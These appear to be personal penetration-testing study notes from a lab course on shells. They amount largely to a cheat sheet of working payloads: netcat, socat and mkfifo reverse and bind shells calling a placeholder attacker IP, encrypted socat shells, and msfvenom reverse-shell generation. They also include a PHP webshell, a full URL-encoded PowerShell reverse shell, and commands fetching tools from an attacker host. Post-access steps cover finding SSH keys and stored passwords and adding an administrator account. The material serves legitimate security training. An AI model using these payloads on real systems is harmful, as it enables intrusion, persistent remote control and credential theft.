liam's favorite- https://www.revshells.com/

Aside from the tools we've already covered, there are some repositories of shells in many different languages. One of the most prominent of these is [Payloads all the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md). The PentestMonkey [Reverse Shell Cheatsheet](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) is also commonly used. In addition to these online resources, Kali Linux also comes pre-installed with a variety of webshells located at `/usr/share/webshells`. The [SecLists repo](https://github.com/danielmiessler/SecLists), though primarily used for wordlists, also contains some very useful code for obtaining shells.


- **Reverse shells** are when the target is forced to execute code that connects _back_ to your computer. On your own computer you would use a tools to set up a _listener_ which would be used to receive the connection.

-Reverse shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target; however, the drawback is that, when receiving a shell from a machine across the internet, you would need to configure your own network to accept the shell.


- **Bind shells** are when the code executed on the target is used to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way.
 
-This has the advantage of not requiring any configuration on your own network, but may be prevented by firewalls protecting the target.



**interactive shell**: If you've used Powershell, Bash, Zsh, sh, or any other standard CLI environment then you will be used to  
interactive shells. These allow you to interact with programs after executing them. For example, take the SSH login prompt:![[Pasted image 20251103103707.png]]
Here you can see that it's asking _interactively_ that the user type either yes or no in order to continue the connection. This is an interactive program, which requires an interactive shell in order to run.

**non interactive shell** don't give you that luxury. In a non-interactive shell you are limited to using programs which do not require user interaction in order to run properly. Unfortunately, the majority of simple reverse and bind shells are non-interactive, which can make further exploitation trickier. Let's see what happens when we try to run SSH in a non-interactive shell:

![[Pasted image 20251103103814.png]]
Notice that the `whoami` command (which is non-interactive) executes perfectly, but the `ssh` command (which _is_ interactive) gives us no output at all
#### rev shell example:
##### ncat
![[Pasted image 20251103102548.png]]


#### Bind Shell example:
First, we start a listener on the target -- this time we're also telling it to execute `cmd.exe`. Then, with the listener up and running, we connect from our own machine to the newly opened port.

(listener - alias for sudo rlwrap nc -lvnp 443 )
![[Pasted image 20251103103121.png|800]]



#### from non-interactive to interactive shell:

 netcat "shells" really being processes running _inside_ a terminal, rather than being bonafide terminals in their own right. They are non-interactive.

##### Python:
 applicable only to Linux boxes
 
step one:  python -c 'import pty;pty.spawn("/bin/bash")'
At this point our shell will look a bit prettier

step two: export TERM=xterm
this will give us access to term commands such as `clear`

step three:
background the shell using Ctrl + Z.
Back in our own terminal we use `stty raw -echo; fg`


#### rlwrap
rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell;

step one:
`sudo apt install rlwrap`.
rlwrap nc -lvnp port

step two in the shell:
background the shell with Ctrl + Z, then use `stty raw -echo; fg` to stabilise and re-enter the shell.



#### Socat
on tha attacker maching:
sudo python3 -m http.server 80

on the target:

linux:
wget attacker_ip/socat -O /tmp/socat

windows:
Invoke-WebRequest -uri attacker_ip/socat.exe -outfile C:\\Windows\temp\socat.exe

to change shell size:

stty

###### reverse shell

on attacker maching:

`socat TCP-L:<port> -`

on attacker maching if the target is linux:
`socat TCP-L:<port> FILE:`tty`,raw,echo=0`

on target maching:
windows:
`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`
linux:
`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`
or use:
`socat TCP:<ATTACKER-IP>:<ATTACKER-PORT> EXEC:"bash -li"`,pty,stderr,sigint,setsid,sane

The first part is easy -- we're linking up with the listener running on our own machine. The second part of the command creates an interactive bash session with  `EXEC:"bash -li"`. We're also passing the arguments: pty, stderr, sigint, setsid and sane

###### encrypted socat rev shell:

on our attacking maching :
`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`

 `cat shell.key shell.crt > shell.pem`
 
`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`

on target maching;

`socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`


###### Bind Shells
on the linux target:
`socat TCP-L:<PORT> EXEC:"bash -li"`
on the windows target:
`socat TCP-L:<PORT> EXEC:powershell.exe,pipes`

on attacker maching:
`socat TCP:<TARGET-IP>:<TARGET-PORT> -`

###### encrypted socat bind shell:
on target maching;
`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`

on attacket maching;
`socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`


###### encrypted socat better shell:

listener:
socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:'tty',raw,echo=0
connect:
socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane




#### msfvenom

`msfvenom -p <PAYLOAD> <OPTIONS>`

generate a reverse shell on attacker maching:

`msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`

 **-f**=format
 -o=file
 -LHOST=ip
 -LPORT=port
 
##### staged payloads-attack is split into two parts and uses a  multi/handler
stager-piece of code which is executed on the server and connects back to the listener on the attacker
real payload-after the connection to the listener the connection is used to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions.
##### stageless payloads
 there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.

to set a listener we will:
`use multi/handler`, and press enter
- `set PAYLOAD <payload>`
- `set LHOST <listen-address>`
- `set LPORT <listen-port>`
  These are all identical to the options we set when generating  shellcode with Msfvenom -- a payload specific to our target
- 
`exploit -j` to run the listener in the background

#### WebShells
very simple shell to be uploaded on the server;
![[Pasted image 20251103151052.png]]
==**<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>==**
![[Pasted image 20251103151013.png]]

 there are a variety of webshells available on Kali by default at `/usr/share/webshells`
  the infamous [PentestMonkey php-reverse-shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)


  most generic, language specific (e.g. PHP) reverse shells are written for Unix based targets such as Linux webservers. They will not work on Windows by default.
  
When the target is Windows, it is often easiest to obtain RCE using a web shell, or by using msfvenom to generate a reverse/bind shell in the language of the server. With the former method, obtaining RCE is often done with a URL Encoded Powershell Reverse Shell. This would be copied into the URL as the `cmd` argument:
```powershell
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```

also if the target is linux you can upload:
/usr/share/webshells/php/php-reverse-shell.php

and on attacker do;
nc -lvnp 1234



#### AFTER WE HAVE A SHELL

LINUX:

On Linux ideally we would be looking for opportunities to gain access to a user account. SSH keys stored at `/home/<user>/.ssh` are often an ideal way to do this.

Some exploits will also allow you to add your own account. In particular something like [Dirty C0w](https://dirtycow.ninja/) or a writeable /etc/shadow or /etc/passwd would quickly give you SSH access to the machine, assuming SSH is open.

WINDOWS:

It's sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at `C:\Program Files\FileZilla Server\FileZilla Server.xml`  
 or `C:\xampp\FileZilla Server\FileZilla Server.xml`
 . These can be MD5 hashes or in plaintext, depending on the version.
 
Ideally on Windows you would obtain a shell running as the SYSTEM user, or an administrator account running with high privileges. In such a situation it's possible to simply add your own account (in the administrators group) to the machine, then log in over RDP, telnet, winexe, psexec, WinRM or any number of other methods, dependent on the services running on the box.

rdp - xfreerdp3 /v:10.10.234.239 /u:thm /p:TryHackM3 +clipboard
The syntax for this is as follows:

`net user <username> <password> /add`

`net localgroup administrators <username> /add`

#### MKFIFO

##### bind shell
on target maching:
`mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
on attacker;
nc local-ip port -e /bin/bash

##### reverse shell
on attacker maching;
 nc -lvnp port

on target maching:
`mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`

this is better:
`rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc <LOCAL-IP> <PORT> > /tmp/f 


